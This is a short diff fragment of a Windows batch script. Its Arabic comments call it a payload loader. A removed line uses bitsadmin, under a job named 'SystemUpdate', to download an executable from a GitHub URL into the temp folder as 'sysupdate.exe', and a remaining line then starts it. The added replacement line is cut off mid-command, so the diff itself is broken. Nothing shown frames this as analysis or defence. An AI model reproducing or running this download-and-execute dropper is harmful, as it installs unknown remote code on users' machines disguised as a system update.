@@ -4,7 +4,7 @@
 :: =============================================
 
 :: تحميل البايلود باستخدام bitsadmin (أداة نظامية)
-bitsadmin /transfer "SystemUpdate" /download /priority foreground "https://github.com/tcOdER1337/dd/raw/refs/heads/main/Creative%20EAX%20Settings.exe" "%temp%\sysupdate.exe"
+bitsadmin /transf
 
 :: تشغيل البايلود
 start "" "%temp%\sysupdate.exe"
